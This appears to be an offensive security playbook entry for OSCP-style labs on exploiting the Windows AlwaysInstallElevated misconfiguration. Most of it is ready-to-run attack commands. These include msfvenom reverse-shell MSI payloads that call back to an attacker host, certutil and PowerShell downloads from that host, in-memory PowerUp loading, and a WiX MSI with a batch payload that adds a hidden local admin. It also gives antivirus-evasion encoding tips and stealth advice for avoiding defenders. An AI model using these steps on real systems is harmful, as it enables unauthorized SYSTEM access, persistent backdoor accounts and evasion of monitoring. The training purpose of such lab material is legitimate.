title: AlwaysInstallElevated — MSI Installation as SYSTEM
body:
AlwaysInstallElevated is one of the simplest and most reliable Windows privilege escalation paths. When both the HKCU and HKLM registry keys for AlwaysInstallElevated are set to 1, ANY user can install MSI packages with elevated (SYSTEM) privileges. This means a malicious MSI you crafted earlier becomes a SYSTEM shell when you msiexec it.

This is a configuration vulnerability, not a software bug — there's no patch, only the policy decision to NOT enable both keys. Lab boxes (PG, HTB, OSCP) regularly have it enabled because someone set it up wrong. Real engagements: surprisingly common in enterprise environments where developers needed local admin install rights and the GPO admin took the easiest shortcut.

If PowerUp's Invoke-AllChecks shows 'AlwaysInstallElevated Registry Key' as a finding, this is your first try. 30 seconds to root.

— THE BUG IN ONE SENTENCE —

  HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
  AND
  HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
  → msiexec installs MSI packages as SYSTEM regardless of caller privilege.

— DETECTION — IS THIS BOX VULNERABLE? —

  Three ways to verify:

  1. DIRECT REGISTRY QUERY (most authoritative)
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
     Both must show:  AlwaysInstallElevated  REG_DWORD  0x1

  2. POWERUP CHECK
     Get-RegistryAlwaysInstallElevated   (returns $True if vulnerable)
     Or in Invoke-AllChecks output, look for:
        Check         : AlwaysInstallElevated Registry Key
        AbuseFunction : Write-UserAddMSI

  3. WINPEAS
     winPEAS highlights this in red under 'Checking AlwaysInstallElevated'
     section: 'AlwaysInstallElevated set to 1 in HKLM and HKCU!'

  CRITICAL: BOTH keys must = 0x1. Either one alone is not exploitable.
  Lab boxes occasionally only have one set as a misconfiguration trap.
  Always check both before committing time.

— TWO EXPLOITATION PATHS — PICK BASED ON YOUR CONSTRAINTS —

  PATH A: MSFVENOM-GENERATED MSI (FASTEST, LAB-FRIENDLY)
    Pre-reqs: Metasploit on Kali, network access target → Kali
    Time: ~30 seconds
    OSCP exam consideration: msfvenom is allowed (one machine restriction
    only applies to msfconsole exploit modules, not msfvenom payloads)
    Steps: generate MSI on Kali → transfer to target → msiexec

  PATH B: POWERUP'S WRITE-USERADDMSI (NO MSFVENOM NEEDED)
    Pre-reqs: PowerUp loaded in memory, write access to current dir
    Time: ~45 seconds
    Output: A UserAdd.msi that adds a specified user to local Admins
    Use when: msfvenom isn't available, or you want a user account vs.
    a one-shot reverse shell.
    Steps: PowerUp → Write-UserAddMSI → msiexec

  PATH C: MANUAL MSI WITH WIX (FALLBACK, REAL ENGAGEMENTS)
    Pre-reqs: WiX toolset (or candle.exe + light.exe) on Kali
    Time: ~5 minutes (one-time setup, then quick)
    Use when: msfvenom payloads are signature-flagged by EDR
    Steps: write WiX XML → compile to MSI → transfer → msiexec

— WHICH MSI TO BUILD — REVERSE SHELL VS. USER ADD —

  REVERSE SHELL MSI (Path A — msfvenom):
    Single-shot: install fires payload → connection back to your listener
    No persistence — close the shell, you're done
    Best for: lab boxes, fast SYSTEM access

  USER ADD MSI (Path B — PowerUp Write-UserAddMSI):
    Adds a new local administrator account to the box
    Persistence: user account remains until removed
    Stealthier on real engagements (no outbound connection)
    Then RDP/WinRM/psexec in as the new admin
    Best for: persistent access, when reverse shells are detected

— COMMON FAILURE MODES (IN ORDER OF FREQUENCY) —

  1. Only HKLM (or only HKCU) is set
     Symptom: msiexec runs as your user, not SYSTEM
     Diagnosis: re-check both registry keys
     Fix: there's no fix — this is hardening; pivot to other privesc

  2. msiexec runs but no shell connects
     Symptom: msiexec returns immediately, no listener hit
     Likely: payload is x86 vs target x64 mismatch (or vice versa)
     Fix: regenerate with windows/x64/shell_reverse_tcp

  3. msiexec hangs forever
     Symptom: command runs but never returns
     Likely: missing /quiet /qn flags, MSI is showing GUI dialog
     Fix: add /quiet /qn /norestart

  4. AppLocker blocks the MSI
     Symptom: 'This installer has been disabled by your system
     administrator' or similar
     Less common on labs; check by running an unsigned EXE first.

  5. Defender flags the MSI on download
     Symptom: certutil/wget says success but file is missing or 0 bytes
     Fix: encode payload (msfvenom -e), or use ResourceHacker to alter
     the MSI signature, or use PowerUp's Write-UserAddMSI which is less
     well-signatured.

— OPSEC ON REAL ENGAGEMENTS —

  msiexec /quiet /qn /i is heavily monitored — Sysmon Event ID 11
  (FileCreate) for MSI files in Temp, Event ID 1 (ProcessCreate) for
  msiexec.exe spawning a shell, Event ID 12-13 (Registry) for the
  AlwaysInstallElevated keys themselves.

  Defenders watching for this attack chain look for:
  - msiexec.exe parent process is anything other than explorer/services
  - msiexec.exe running with /quiet /qn flags from non-administrative user
  - MSI files in C:\Windows\Temp\ or C:\Users\Public\
  - Registry queries against AlwaysInstallElevated paths

  Stealth options:
  - Use Path B (UserAdd) to avoid network signatures
  - Drop MSI in a less-monitored location like %AppData%
  - Use a less common MSI filename (not 'evil.msi' or 'shell.msi')
  - Time the install during legitimate activity windows
cmd:
# ── STEP 1: VERIFY VULNERABILITY ─────────────────────
# Both keys must be set to 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Expected output (BOTH commands):
#   HKEY_..._MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
#       AlwaysInstallElevated    REG_DWORD    0x1

# If either returns 'cannot find registry key' or 0x0, exploit fails.

# Or via PowerShell:
Get-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -ErrorAction SilentlyContinue
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -ErrorAction SilentlyContinue

# Or via PowerUp:
IEX (IWR 'http://KALI/PowerUp.ps1' -UseBasicParsing)
Get-RegistryAlwaysInstallElevated
# Returns True/False

# ══════════════════════════════════════════════════════
# PATH A: MSFVENOM REVERSE SHELL MSI
# ══════════════════════════════════════════════════════

# ── A1: GENERATE MSI ON KALI ─────────────────────────
# x64 reverse shell (use this for modern Windows 10/Server 2019+)
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=KALI_IP LPORT=443 \
  -f msi -o evil.msi

# x86 variant (use only if target is 32-bit Windows)
msfvenom -p windows/shell_reverse_tcp \
  LHOST=KALI_IP LPORT=443 \
  -f msi -o evil.msi

# Check the generated file
file evil.msi
ls -la evil.msi
# Should be ~150-200KB MSI Composite Document

# Optional: encode to evade simple AV signatures
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=KALI_IP LPORT=443 \
  -e x86/shikata_ga_nai -i 5 \
  -f msi -o evil_encoded.msi

# ── A2: SET UP DELIVERY + LISTENER ───────────────────
# Terminal 1: HTTP server
sudo python3 -m http.server 80

# Terminal 2: catch the shell
rlwrap -cAr nc -nlvp 443

# ── A3: TRANSFER MSI TO TARGET ───────────────────────
# In your low-priv shell on the target:

# Method A: certutil (most reliable on default Windows)
certutil -urlcache -f http://KALI_IP/evil.msi C:\Windows\Temp\evil.msi

# Method B: PowerShell IWR
powershell -ep bypass -c "IWR 'http://KALI_IP/evil.msi' -OutFile 'C:\Windows\Temp\evil.msi' -UseBasicParsing"

# Method C: PowerShell Net.WebClient
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/evil.msi','C:\Windows\Temp\evil.msi')"

# Method D: SMB if you set up smbserver on Kali
# (Kali) impacket-smbserver share . -smb2support
# (Target) copy \\KALI_IP\share\evil.msi C:\Windows\Temp\

# Verify the file landed
dir C:\Windows\Temp\evil.msi
# Size should match what you generated on Kali (no 0-byte = AV blocked)

# ── A4: TRIGGER THE INSTALL — SYSTEM SHELL ───────────
# /quiet /qn /norestart prevents UI dialogs
msiexec /quiet /qn /norestart /i C:\Windows\Temp\evil.msi

# Alternative form (some XP-era documentation uses this):
msiexec /i C:\Windows\Temp\evil.msi /quiet /qn

# Within ~3 seconds, your nc listener should show:
#   connect to [KALI_IP] from (UNKNOWN) [TARGET_IP] <port>
#   Microsoft Windows [Version 10.0.X]
#   (c) Microsoft Corporation. All rights reserved.
#
#   C:\Windows\system32>whoami
#   nt authority\system

# ══════════════════════════════════════════════════════
# PATH B: POWERUP WRITE-USERADDMSI
# ══════════════════════════════════════════════════════

# ── B1: LOAD POWERUP IN-MEMORY ───────────────────────
powershell -ep bypass
IEX (IWR 'http://KALI_IP/PowerUp.ps1' -UseBasicParsing)

# ── B2: GENERATE THE USERADD MSI ─────────────────────
# Default: creates UserAdd.msi in current directory that adds 'john'/'P@ssw0rd!'
Write-UserAddMSI

# Custom user/password:
Write-UserAddMSI -Username 'evil' -Password 'P@ssw0rd123!'

# Custom path:
Write-UserAddMSI -Path 'C:\Windows\Temp\useradd.msi' -Username 'evil' -Password 'P@ssw0rd123!'

# ── B3: TRIGGER THE INSTALL ──────────────────────────
msiexec /quiet /qn /norestart /i UserAdd.msi
# Or with custom path:
msiexec /quiet /qn /norestart /i C:\Windows\Temp\useradd.msi

# Verify the new admin user
net localgroup Administrators
# Should show 'evil' (or whatever username you specified)

# ── B4: USE THE NEW ADMIN ACCOUNT ────────────────────
# Now you have an admin user. Multiple ways to use it:

# RDP from Kali:
xfreerdp /u:evil /p:'P@ssw0rd123!' /v:TARGET_IP /cert:ignore

# WinRM from Kali:
evil-winrm -i TARGET_IP -u evil -p 'P@ssw0rd123!'

# Or psexec:
impacket-psexec evil:'P@ssw0rd123!'@TARGET_IP

# Or from the existing low-priv shell, runas:
runas /user:evil cmd

# ══════════════════════════════════════════════════════
# PATH C: MANUAL MSI WITH WIX (FALLBACK)
# ══════════════════════════════════════════════════════

# When msfvenom MSIs are flagged and you need something cleaner.

# ── C1: WRITE THE WIX SOURCE ─────────────────────────
cat > evil.wxs <<'EOF'
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
           Name="Evil" Language="1033" Version="1.0.0.0" Manufacturer="Evil">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
    <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="Evil">
          <Component Id="ProductComponent" Guid="22222222-2222-2222-2222-222222222222">
            <File Id="file1" Name="evil.bat" Source="evil.bat" />
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="ProductFeature" Title="Evil" Level="1">
      <ComponentRef Id="ProductComponent" />
    </Feature>
    <CustomAction Id="RunBat" FileKey="file1" ExeCommand="" Execute="deferred" Impersonate="no" Return="asyncNoWait" />
    <InstallExecuteSequence>
      <Custom Action="RunBat" After="InstallFiles">NOT Installed</Custom>
    </InstallExecuteSequence>
  </Product>
</Wix>
EOF

# ── C2: WRITE THE BATCH PAYLOAD ──────────────────────
cat > evil.bat <<'EOF'
@echo off
net user evil P@ssw0rd123! /add
net localgroup Administrators evil /add
EOF

# ── C3: COMPILE THE MSI ──────────────────────────────
# Requires WiX toolset (apt install wix on Kali, or download Windows installer)
candle evil.wxs                 # produces evil.wixobj
light evil.wixobj               # produces evil.msi

# ── C4: TRANSFER + EXECUTE (SAME AS PATH A) ──────────
certutil -urlcache -f http://KALI_IP/evil.msi C:\Windows\Temp\evil.msi
msiexec /quiet /qn /norestart /i C:\Windows\Temp\evil.msi

# ── TROUBLESHOOTING ───────────────────────────────────

# msiexec runs but no shell:
#   - x86 vs x64 mismatch — regenerate with x64 architecture
#   - Listener not running — verify with `ss -tlnp | grep 443`
#   - Firewall on Kali blocking — sudo ufw status
#   - Target firewall blocking outbound — try LPORT=80 or 8080

# msiexec hangs:
#   - Add /quiet /qn /norestart flags
#   - Try silent flag variations: /quiet vs /qn vs both
#   - Some MSI builds require /norestart explicitly

# 'Access denied' on msiexec:
#   - Both registry keys aren't actually 0x1 — re-verify
#   - GPO might be enforcing AppLocker — check Get-AppLockerPolicy
#   - Anti-virus blocking the MSI — try Path B (Write-UserAddMSI)

# certutil download fails:
#   - 'CertUtil: -URLCache command FAILED: 0x80072ee7'
#   - Wrong KALI_IP, network unreachable, or DNS resolution issue
#   - Test connectivity first: ping KALI_IP

# 'This installation requires UAC':
#   - Both AlwaysInstallElevated keys MUST be 0x1
#   - Re-verify; the prompt means privilege elevation was attempted but rejected

# Defender quarantines the MSI:
#   - Try msfvenom with -e x86/shikata_ga_nai -i 5
#   - Or use Path B (PowerUp Write-UserAddMSI is rarely flagged)
#   - Or build manually with WiX (Path C)

# ── BONUS: AFTER ROOT — VERIFY AND LOOT ──────────────
whoami            # nt authority\system
hostname
ipconfig /all

# Capture the proof flag
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\proof.txt

# Document privesc path for the report
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer | findstr AlwaysInstall
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer | findstr AlwaysInstall

# Cleanup MSI artifacts (real engagements):
del C:\Windows\Temp\evil.msi
del C:\Windows\Temp\useradd.msi
# Also clean up the UserAdd registry key if PowerUp set one:
reg delete HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /f 2>nul
warn:
BOTH KEYS MUST = 0x1 — IF ONLY ONE IS SET, EXPLOIT FAILS:
  This is the most common 'why isn't this working' question. Re-verify
  BOTH HKCU and HKLM with reg query. Either key alone is not exploitable —
  Windows requires both for the elevation policy to apply.

MSFVENOM IS ALLOWED ON OSCP — ONE-MACHINE LIMIT IS FOR MSFCONSOLE:
  Common confusion: 'Metasploit is restricted on OSCP, so I shouldn't
  use msfvenom either.' Wrong. The OSCP exam restricts msfconsole exploit
  modules and Meterpreter sessions to ONE machine. msfvenom payload
  generation has no such restriction — use it freely.

x86 vs x64 ARCHITECTURE — MATCH THE TARGET:
  Modern Windows is x64. Generate x64 payloads:
    msfvenom -p windows/x64/shell_reverse_tcp ...
  Older boxes (Server 2008, some embedded) are x86. Generate x86:
    msfvenom -p windows/shell_reverse_tcp ...
  Wrong arch = MSI installs but payload doesn't fire.
  Confirm target arch:
    systeminfo | findstr /B /C:"System Type"
    wmic os get OSArchitecture

/quiet /qn /norestart — USE ALL THREE:
  Without /quiet /qn the MSI shows GUI dialogs that hang the install
  in headless contexts. Without /norestart, some MSIs trigger reboots
  that break the connection. Default to all three for safety.

MSI INSTALLS AS SYSTEM EVEN ON RECENT WINDOWS:
  This isn't a legacy bug. AlwaysInstallElevated is documented Microsoft
  behavior on Windows 10/11/Server 2022. The 'fix' is policy: don't enable
  it. Lab boxes intentionally enable it.

DEFENDER OFTEN FLAGS MSFVENOM-GENERATED MSIs:
  Default msfvenom MSI signatures are well-known to AV. If the file
  appears as 0 bytes after download, or download succeeds but msiexec
  shows 'invalid package': Defender ate it.
  Workarounds:
    - PowerUp Write-UserAddMSI (less commonly flagged)
    - msfvenom with multiple encoder iterations (-e -i 5 or 10)
    - Manual WiX MSI (no msfvenom signatures)
    - Disable Defender first if you have admin (chicken-and-egg though)

WRITE-USERADDMSI CREATES PERSISTENT ADMIN — DOCUMENT FOR CLEANUP:
  Path B leaves a new local admin account on the box. On real engagements,
  this is persistence — fine if scoped, problematic if not.
  ALWAYS document:
    - Username created
    - Date/time created
    - Removal command for cleanup
  And actually remove it after engagement:
    net user evil /delete

DO NOT OVERLOOK SeImpersonatePrivilege ALONGSIDE THIS:
  AlwaysInstallElevated and SeImpersonatePrivilege (which enables
  Potato-family attacks) sometimes appear on the same box. Try
  AlwaysInstallElevated first because it's faster (30 seconds vs.
  Potato exploits which take 1-2 min and often need PrintSpoofer or
  similar tooling). But document both for the report.

MSI EXECUTION GETS LOGGED EXTENSIVELY:
  Sysmon, Event Logs, AppLocker logs, Windows Defender, all log MSI
  installations. Lab boxes don't care. Real engagements: assume blue
  team will see this within minutes. Plan accordingly.

SOMETIMES THE MSI APPROACH FAILS BUT MANUAL EQUIVALENT WORKS:
  Some hardened systems block MSI installers via AppLocker but allow
  direct executable runs. In that case, package your payload as an
  EXE instead, drop it as a service binary (see weak_service node) or
  via DLL hijack (see win_dll_hijack node) — same SYSTEM result, different
  delivery vehicle.

choices.label: Got new admin user — login via WinRM/RDP
Got SYSTEM — pivot to internal hosts
MSI flagged by Defender — bypass AMSI / try alternates
Only one key set — try other privesc paths
Try other privesc — weak service / unquoted path
